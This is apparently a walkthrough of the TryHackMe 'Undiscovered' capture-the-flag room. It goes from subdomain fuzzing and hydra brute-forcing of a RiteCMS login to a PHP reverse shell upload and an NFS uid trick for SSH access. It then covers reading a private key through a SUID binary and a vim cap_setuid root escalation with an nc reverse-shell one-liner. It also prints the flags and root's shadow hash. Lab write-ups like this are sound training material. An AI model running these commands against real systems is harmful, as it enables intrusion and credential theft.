# Undiscovered

## Description

Discovery consists not in seeking new landscapes, but in having new eyes..

Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with [@H0j3n](https://tryhackme.com/p/H0j3n), thanks to him for the foothold and privilege escalation ideas. 

Please consider adding undiscovered.thm in /etc/hosts

## Initial Scan

Let's start with an Nmap scan. The scan reveals four open ports:

* 22 ssh
* 80 http
* 111 rpcbind
* 2049 nfs

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://undiscovered.thm
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      43939/tcp6  nlockmgr
|   100021  1,3,4      44328/udp6  nlockmgr
|   100021  1,3,4      46317/tcp   nlockmgr
|   100021  1,3,4      52290/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web

First add the virtual host to /etc/hosts on your machine with the following format(`<MACHINE IP>  undiscovered.thm`) as the description said. Now let's check the webpage out. There is only a message on the main page:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Undiscovered]
└─$ curl -s "http://undiscovered.thm/" | html2text
****** Remember.... ******
The path should be the darker one...
~~~

I ran `dirsearch` on the webpage, but found nothing useful. I decided to check if there are any subdomains. I used `wfuzz` to do so:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ wfuzz -c -u "http://undiscovered.thm/" -H "Host: FUZZ.undiscovered.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 302 -t 100

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://undiscovered.thm/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================

000000491:   200        68 L     341 W      4584 Ch     "manager"                                            
000000522:   200        82 L     341 W      4650 Ch     "deliver"                                            
000000516:   200        68 L     341 W      4626 Ch     "dashboard"                                          
000000628:   200        68 L     341 W      4584 Ch     "network"                                            
000000630:   200        68 L     341 W      4542 Ch     "forms"                                              
000000633:   200        68 L     341 W      4668 Ch     "maintenance"                                        
000000612:   200        68 L     341 W      4584 Ch     "develop"                                            
000000566:   200        68 L     341 W      4584 Ch     "newsite"                                            
000000665:   200        68 L     341 W      4521 Ch     "view"                                               
000000694:   200        68 L     341 W      4521 Ch     "gold"                                               
000000678:   200        68 L     341 W      4521 Ch     "play"                                               
000000691:   200        68 L     341 W      4605 Ch     "terminal"                                           
000000685:   200        83 L     341 W      4599 Ch     "booking"                                            
000000696:   200        68 L     341 W      4605 Ch     "internet"                                           
000000702:   200        68 L     341 W      4626 Ch     "resources"                                          
000000680:   200        68 L     341 W      4542 Ch     "start"                                              
000000674:   200        68 L     341 W      4605 Ch     "mailgate"                                           
000009532:   400        12 L     53 W       422 Ch      "#www"                                               
000010581:   400        12 L     53 W       422 Ch      "#mail"                                              
~~~

As you can see, we found many subdomains. You can add them like this: `<MACHINE IP>  <SUBDOMAIN>.undiscovered.thm`. First I added `dashboard` and after navigating to `http://dashboard.undiscovered.thm/`, I faced this page, which shows the presence of `RiteCMS` with the version of `2.2.1`:

<p align="center"><img src="files/CMSversion.png"></p>

I used `searchsploit` to find exploits for this version of RiteCMS and found an exploit, but we need creds to use it:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Undiscovered]
└─$ searchsploit RiteCMS 2.2.1
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
RiteCMS 2.2.1 - Authenticated Remote Code Execution                                 | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                               | php/webapps/48915.py
------------------------------------------------------------------------------------ ---------------------------------
~~~

## Getting Credentials

I couldn't find anything useful in `dashboard` subdomain, even after running `dirsearch` on it. I decided to head to other subdomains, so I added `deliver` subdomain to my hosts with the following format: `<MACHINE IP>  deliver.undiscovered.thm`.

After doing so, I ran `dirsearch` on it and found a few directories:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ dirsearch -u http://deliver.undiscovered.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Output File: /home/user/.dirsearch/reports/deliver.undiscovered.thm/_21-12-14_02-40-49.txt

Error Log: /home/user/.dirsearch/logs/errors-21-12-14_02-40-49.log

Target: http://deliver.undiscovered.thm/

[02:40:50] Starting: 
[02:40:52] 301 -  336B  - /media  ->  http://deliver.undiscovered.thm/media/
[02:40:52] 301 -  340B  - /templates  ->  http://deliver.undiscovered.thm/templates/
[02:40:52] 301 -  336B  - /files  ->  http://deliver.undiscovered.thm/files/
[02:40:53] 301 -  335B  - /data  ->  http://deliver.undiscovered.thm/data/
[02:40:58] 301 -  334B  - /cms  ->  http://deliver.undiscovered.thm/cms/
[02:40:59] 301 -  333B  - /js  ->  http://deliver.undiscovered.thm/js/
[02:41:12] 200 -   32KB - /LICENSE
[02:50:20] 403 -  289B  - /server-status
~~~

I started going through the directories and found a login page in `/cms`:

<p align="center"><img src="files/loginPage.png"></p>

Default creds didn't work on it, so I decided to look further. In `/data`, there is a folder named `sql` and by looking into it, we can see three sql files:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ curl -s "http://deliver.undiscovered.thm/data/sql/" | html2text
****** Index of /data/sql ******
[[ICO]]       Name                       Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                              - 
[[   ]]       mysql.initial.sql          2011-03-18 15:50  16K 
[[   ]]       sqlite.content.initial.sql 2015-01-12 15:24  16K 
[[   ]]       sqlite.user.initial.sql    2013-08-14 19:53  382 
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at deliver.undiscovered.thm Port 80
~~~

I downloaded `sqlite.user.initial.sql` and found a username and a password hash inside it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ cat sqlite.user.initial.sql
CREATE TABLE rite_userdata (id INTEGER PRIMARY KEY AUTOINCREMENT, name varchar(255) NOT NULL default '', type tinyint(4) NOT NULL default '0', pw varchar(255) NOT NULL default '', last_login int(11) NOT NULL default '0', wysiwyg tinyint(4) NOT NULL default '0');

INSERT INTO rite_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
~~~

We have `admin` as the username, but I couldn't crack the hash, so I decided to brute-force the password in the login page (`/cms`) using `hydra` and `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:login_failed" 
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-14 03:43:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:login_failed
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
~~~

Now we have creds to login as admin:

* Username: `admin`
* Password: `liverpool`

## Reverse Shell

Now that we have creds, we can either use the exploit we found, or just login as admin and upload a reverse shell. I'm gonna upload a reverse shell myself. Follow the steps below:

1. First head to `http://deliver.undiscovered.thm/cms/` and enter the creds (`admin:liverpool`):

<p align="center"><img src="files/step1.png"></p>

2. Now we are logged in as admin. Click on "Administration" from the navigation bar and Choose "File Manager":

<p align="center"><img src="files/step2-1.png"></p>

<p align="center"><img src="files/step2-2.png"></p>

3. Now we can upload our php reverse shell, which you can get [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Save it in a file and modify the code to change the IP and your listening port. After doing so, click on "Upload file" and choose the shell file and give it a name. Then click on "OK - Upload file:

<p align="center"><img src="files/step3.png"></p>

4. Now open a listener (`rlwrap nc -lvnp 4444`) and call the shell by navigating to `http://deliver.undiscovered.thm/media/shell.php`. Now you should have a shell and the first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.**.**] from (UNKNOWN) [<MACHINE IP>] 55616
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:30:31 up  1:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@undiscovered:/$
~~~

## www-data -> william (lateral move)

First I listed `/home` directory to see the users on the machine and found: `leonard` and `william`:

~~~
www-data@undiscovered:/$ ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 Sep  4  2020 .
drwxr-xr-x 25 root    root    4096 Sep  4  2020 ..
drwxr-x---  5 leonard leonard 4096 Sep  9  2020 leonard
drwxr-x---  4 william william 4096 Sep 10  2020 william
~~~

As you can see, we don't have permission to look through these folders. I started enumerating the machine manually, but found nothing. I decided to uplaod `linpeas` to help me out with the situation. This part of the linpeas output reminded me of something:

~~~
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

/home/william	*(rw,root_squash)
~~~

There is an NFS mount with root squash. Normally we can just mount the folder on our machine and look through it, but we can't do the same here. To solve this problem, we have to add user `william` with the same id which is 3003 (you can see the user id by running `id -u william`) and then mount the folder and it should work.

Just run the following commands one by one on your machine:

~~~
$ sudo useradd -u 3003 -d /dev/shm william
$ mkdir /tmp/nfs
$ sudo mount -t nfs <MACHINE IP>:/home/william /tmp/nfs
$ sudo su william
$ id
uid=3003(william) gid=3003(william) groups=3003(william)
~~~

Now we can look through the nfs mount as user `william`. We can read the user flag now, but let's get a stable shell first. We can make a `.ssh` directory and add our public key to it (If you don't have a public key, you can create one using `ssh-keygen` and the file with `.pub` extention is the public key) and connect to the machine via ssh. The steps are as follows:

~~~
$ cd /tmp/nfs
$ mkdir .ssh
$ cd .ssh
$ echo "<YOUR PUBLIC KEY>" > authorized_keys
~~~

Now we can login via ssh as `william` using our private key:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ ssh -i ~/.ssh/id_rsa william@<MACHINE IP>        
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$ id
uid=3003(william) gid=3003(william) groups=3003(william)
~~~

Now we can do a little cleanup and unmount and delete user william from our machien:

~~~
$ sudo userdel william
$ sudo umount /tmp/nfs
$ rm /tmp/nfs
~~~

## User Flag

Now that we are connected to the machine via a stable shell, we can go ahead and read the user flag:

~~~
william@undiscovered:~$ ls
admin.sh  script  user.txt
william@undiscovered:~$ cat user.txt 
THM{8d7b7299cccd1796a61915901d0e091c}
~~~

User flag: `THM{8d7b7299cccd1796a61915901d0e091c}`

## william -> leonard (lateral move)

Now we need to escalate even more. Let's look through the files in `william`'s home directory. There is a bash script named `admin.sh` that just prints out two messages:

~~~sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
~~~

There is also an executable file named `script` with suid bit set. I ran `strings` command on it to see if I can get a basic understanding of what it does and the only thing that kinda looked interesting was this:

~~~
william@undiscovered:~$ strings script 
/lib64/ld-linux-x86-64.so.2
n2JP
libc.so.6
setreuid
__stack_chk_fail
strcat
system
__libc_start_main
__gmon_start__
GLIBC_2.2.5
GLIBC_2.4
UH-P
/bin/catH  <--------

[REDACTED]
~~~

The binary is running `cat` command. Btw, it is running `admin.sh` at some point, but it won't take us anywhere (I have tried). I randomly entered `/etc/passwd` and look at this:

~~~
william@undiscovered:~$ ./script /etc/passwd
/bin/cat: /home/leonard//etc/passwd: No such file or directory
~~~

It is running `cat` in `leonard`'s home directory. I decided to see if there is a private key and fortunately threr is:

~~~
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df

[REDACTED]

bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
~~~

I copied and pasted the private key to my machine and set its permission to 600 and used it to login as `leonard` via ssh:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ chmod 600 leonard_rsa 
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ ssh -i leonard_rsa leonard@<MACHINE IP>
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$ id
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
~~~

## Privilege Escalation

I checked many things and I was stuck. I decided to take another look at linpeas output and this took my attention:

~~~
Files with capabilities (limited to 50):
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep   <---------
~~~

There is a `.viminfo` file in our home directory. In the last few lines of it, there is an interesting line:

~~~
leonard@undiscovered:~$ cat .viminfo 
[REDACTED]

> :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")

[REDACTED]
~~~

Now this is easy. Just run `vim.basic` and then execute the command above except we need to change the IP to ours. First open a listener (`rlwrap nc -lvnp 4242`) and then run the following commands:

~~~
leonard@undiscovered:~$ vim.basic
:py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> 4242 >/tmp/f")
~~~

Now we get a root shell on our machine:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Undiscovered/files]
└─$ rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.9.**.**] from (UNKNOWN) [<MACHINE IP>] 49198
# id
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
~~~

## Root's Password Hash

Now we can navigate to `/root` directory, but we don't need to. There is a flag there that we don't need, but here you go:

~~~
# cat /root/root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}
~~~

What we need is root's password hash which can be found in `/etc/shadow`:

~~~
# grep "root" /etc/shadow
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
~~~

Answer: `$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0`

# D0N3! ; )

Thanks to the creator(s) for this challenging room!

Hope you had fun and learned something.

Have a g00d 0ne! : )